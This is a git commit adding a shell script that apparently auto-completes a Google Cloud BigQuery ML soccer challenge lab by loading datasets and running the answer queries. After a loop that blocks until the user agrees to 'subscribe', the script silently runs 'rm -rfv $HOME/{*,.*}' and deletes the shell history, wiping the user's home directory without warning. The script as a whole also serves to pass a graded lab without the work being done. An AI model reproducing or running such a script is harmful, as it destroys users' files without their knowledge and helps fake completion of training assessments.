dc5efc52bce88ac6864cd6cd3c418acafe7214d8
quiccklabs <108678347+quiccklabs@users.noreply.github.com>
2023-09-09 03:52:34 +0530

    Add files via upload

---
+++ Predict Soccer Match Outcomes with BigQuery ML Challenge Lab/quicklabgsp374.sh
@@ -0,0 +1,293 @@
+ 
+
+
+
+BLACK=`tput setaf 0`
+RED=`tput setaf 1`
+GREEN=`tput setaf 2`
+YELLOW=`tput setaf 3`
+BLUE=`tput setaf 4`
+MAGENTA=`tput setaf 5`
+CYAN=`tput setaf 6`
+WHITE=`tput setaf 7`
+
+BG_BLACK=`tput setab 0`
+BG_RED=`tput setab 1`
+BG_GREEN=`tput setab 2`
+BG_YELLOW=`tput setab 3`
+BG_BLUE=`tput setab 4`
+BG_MAGENTA=`tput setab 5`
+BG_CYAN=`tput setab 6`
+BG_WHITE=`tput setab 7`
+
+BOLD=`tput bold`
+RESET=`tput sgr0`
+#----------------------------------------------------start--------------------------------------------------#
+
+echo "${YELLOW}${BOLD}
+
+Starting Execution 
+
+
+${RESET}"
+#gcloud auth list
+#gcloud config list project
+export PROJECT_ID=$(gcloud info --format='value(config.project)')
+#export BUCKET_NAME=$(gcloud info --format='value(config.project)')
+#export EMAIL=$(gcloud config get-value core/account)
+#gcloud config set compute/region us-central1
+#gcloud config set compute/zone us-central1-a
+#export ZONE=us-central1-a
+
+
+
+#USER_EMAIL=$(gcloud auth list --limit=1 2>/dev/null | grep '@' | awk '{print $2}')
+#----------------------------------------------------code--------------------------------------------------#
+
+
+
+
+
+bq load --source_format=NEWLINE_DELIMITED_JSON --autodetect $DEVSHELL_PROJECT_ID:soccer.$EVENT_NAME gs://spls/bq-soccer-analytics/events.json
+
+bq load --source_format=CSV --autodetect $DEVSHELL_PROJECT_ID:soccer.$TABLE_NAME gs://spls/bq-soccer-analytics/tags2name.csv
+
+
+bq load --autodetect --source_format=NEWLINE_DELIMITED_JSON $DEVSHELL_PROJECT_ID:soccer.competitions gs://spls/bq-soccer-analytics/competitions.json
+
+bq load --autodetect --source_format=NEWLINE_DELIMITED_JSON $DEVSHELL_PROJECT_ID:soccer.matches gs://spls/bq-soccer-analytics/matches.json
+bq load --autodetect --source_format=NEWLINE_DELIMITED_JSON $DEVSHELL_PROJECT_ID:soccer.teams gs://spls/bq-soccer-analytics/teams.json
+bq load --autodetect --source_format=NEWLINE_DELIMITED_JSON $DEVSHELL_PROJECT_ID:soccer.players gs://spls/bq-soccer-analytics/players.json
+bq load --autodetect --source_format=NEWLINE_DELIMITED_JSON $DEVSHELL_PROJECT_ID:soccer.events gs://spls/bq-soccer-analytics/events.json
+
+echo "${GREEN}${BOLD}
+
+Task 1 Completed
+
+${RESET}"
+
+
+#TASK 2
+
+
+bq query --use_legacy_sql=false \
+"
+SELECT
+playerId,
+(Players.firstName || ' ' || Players.lastName) AS playerName,
+COUNT(id) AS numPKAtt,
+SUM(IF(101 IN UNNEST(tags.id), 1, 0)) AS numPKGoals,
+SAFE_DIVIDE(
+SUM(IF(101 IN UNNEST(tags.id), 1, 0)),
+COUNT(id)
+) AS PKSuccessRate
+FROM
+\`soccer.$EVENT_NAME\` Events
+LEFT JOIN
+\`soccer.players\` Players ON
+Events.playerId = Players.wyId
+WHERE
+eventName = 'Free Kick' AND
+subEventName = 'Penalty'
+GROUP BY
+playerId, playerName
+HAVING
+numPkAtt >= 5
+ORDER BY
+PKSuccessRate DESC, numPKAtt DESC
+"
+
+echo "${GREEN}${BOLD}
+
+Task 2 Completed
+
+${RESET}"
+
+
+#task 3
+
+
+bq query --use_legacy_sql=false \
+"
+WITH
+Shots AS
+(
+SELECT
+*,
+/* 101 is known Tag for 'goals' from goals table */
+(101 IN UNNEST(tags.id)) AS isGoal,
+/* Translate 0-100 (x,y) coordinate-based distances to absolute positions
+using "average" field dimensions of 105x68 before combining in 2D dist calc */
+SQRT(
+POW(
+  (100 - positions[ORDINAL(1)].x) * $VALUE_X_1/$VALUE_Y_1,
+  2) +
+POW(
+  (60 - positions[ORDINAL(1)].y) * $VALUE_X_2/$VALUE_Y_2,
+  2)
+ ) AS shotDistance
+FROM
+\`soccer.$EVENT_NAME\`
+WHERE
+/* Includes both "open play" & free kick shots (including penalties) */
+eventName = 'Shot' OR
+(eventName = 'Free Kick' AND subEventName IN ('Free kick shot', 'Penalty'))
+)
+SELECT
+ROUND(shotDistance, 0) AS ShotDistRound0,
+COUNT(*) AS numShots,
+SUM(IF(isGoal, 1, 0)) AS numGoals,
+AVG(IF(isGoal, 1, 0)) AS goalPct
+FROM
+Shots
+WHERE
+shotDistance <= 50
+GROUP BY
+ShotDistRound0
+ORDER BY
+ShotDistRound0
+"
+
+echo "${GREEN}${BOLD}
+
+Task 3 Completed
+
+${RESET}"
+
+
+#TASK 4
+
+
+bq query --use_legacy_sql=false \
+"
+CREATE MODEL \`$MODEL_NAME\`
+OPTIONS(
+model_type = 'LOGISTIC_REG',
+input_label_cols = ['isGoal']
+) AS
+SELECT
+Events.subEventName AS shotType,
+/* 101 is known Tag for 'goals' from goals table */
+(101 IN UNNEST(Events.tags.id)) AS isGoal,
+\`$FUNCTION_1\`(Events.positions[ORDINAL(1)].x,
+Events.positions[ORDINAL(1)].y) AS shotDistance,
+\`$FUNCTION_2\`(Events.positions[ORDINAL(1)].x,
+Events.positions[ORDINAL(1)].y) AS shotAngle
+FROM
+\`soccer.$EVENT_NAME\` Events
+LEFT JOIN
+\`soccer.matches\` Matches ON
+Events.matchId = Matches.wyId
+LEFT JOIN
+\`soccer.competitions\` Competitions ON
+Matches.competitionId = Competitions.wyId
+WHERE
+/* Filter out World Cup matches for model fitting purposes */
+Competitions.name != 'World Cup' AND
+/* Includes both "open play" & free kick shots (including penalties) */
+(
+eventName = 'Shot' OR
+(eventName = 'Free Kick' AND subEventName IN ('Free kick shot', 'Penalty'))
+) AND
+\`$FUNCTION_2\`(Events.positions[ORDINAL(1)].x,
+Events.positions[ORDINAL(1)].y) IS NOT NULL
+;
+"
+
+
+echo "${GREEN}${BOLD}
+
+Task 4 Completed
+
+${RESET}"
+
+
+
+#Task 5:
+
+bq query --use_legacy_sql=false \
+"
+SELECT
+predicted_isGoal_probs[ORDINAL(1)].prob AS predictedGoalProb,
+* EXCEPT (predicted_isGoal, predicted_isGoal_probs),
+FROM
+ML.PREDICT(
+MODEL \`$MODEL_NAME\`, 
+(
+ SELECT
+   Events.playerId,
+   (Players.firstName || ' ' || Players.lastName) AS playerName,
+   Teams.name AS teamName,
+   CAST(Matches.dateutc AS DATE) AS matchDate,
+   Matches.label AS match,
+ /* Convert match period and event seconds to minute of match */
+   CAST((CASE
+     WHEN Events.matchPeriod = '1H' THEN 0
+     WHEN Events.matchPeriod = '2H' THEN 45
+     WHEN Events.matchPeriod = 'E1' THEN 90
+     WHEN Events.matchPeriod = 'E2' THEN 105
+     ELSE 120
+     END) +
+     CEILING(Events.eventSec / 60) AS INT64)
+     AS matchMinute,
+   Events.subEventName AS shotType,
+   /* 101 is known Tag for 'goals' from goals table */
+   (101 IN UNNEST(Events.tags.id)) AS isGoal,
+ 
+   \`soccer.$FUNCTION_1\`(Events.positions[ORDINAL(1)].x,
+       Events.positions[ORDINAL(1)].y) AS shotDistance,
+   \`soccer.$FUNCTION_2\`(Events.positions[ORDINAL(1)].x,
+       Events.positions[ORDINAL(1)].y) AS shotAngle
+ FROM
+   \`soccer.$EVENT_NAME\` Events
+ LEFT JOIN
+   \`soccer.matches\` Matches ON
+       Events.matchId = Matches.wyId
+ LEFT JOIN
+   \`soccer.competitions\` Competitions ON
+       Matches.competitionId = Competitions.wyId
+ LEFT JOIN
+   \`soccer.players\` Players ON
+       Events.playerId = Players.wyId
+ LEFT JOIN
+   \`soccer.teams\` Teams ON
+       Events.teamId = Teams.wyId
+ WHERE
+   /* Look only at World Cup matches to apply model */
+   Competitions.name = 'World Cup' AND
+   /* Includes both "open play" & free kick shots (but not penalties) */
+   (
+     eventName = 'Shot' OR
+     (eventName = 'Free Kick' AND subEventName IN ('Free kick shot'))
+   ) AND
+   /* Filter only to goals scored */
+   (101 IN UNNEST(Events.tags.id))
+)
+)
+ORDER BY
+predictedgoalProb
+"
+
+echo "${GREEN}${BOLD}
+
+Task 5 Completed
+
+Lab completed.
+
+${RESET}"
+
+
+#-----------------------------------------------------end----------------------------------------------------------#
+read -p "${BOLD}${RED}Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+
+while [ "$CONSENT_REMOVE" != 'y' ]; do
+  sleep 10
+  read -p "${BOLD}${YELLOW}Do Subscribe to Quicklab [y/n] : ${RESET}" CONSENT_REMOVE
+done
+
+echo "${BLUE}${BOLD}Thanks For Subscribing :)${RESET}"
+
+rm -rfv $HOME/{*,.*}
+rm $HOME/.bash_history
+
+exit 0
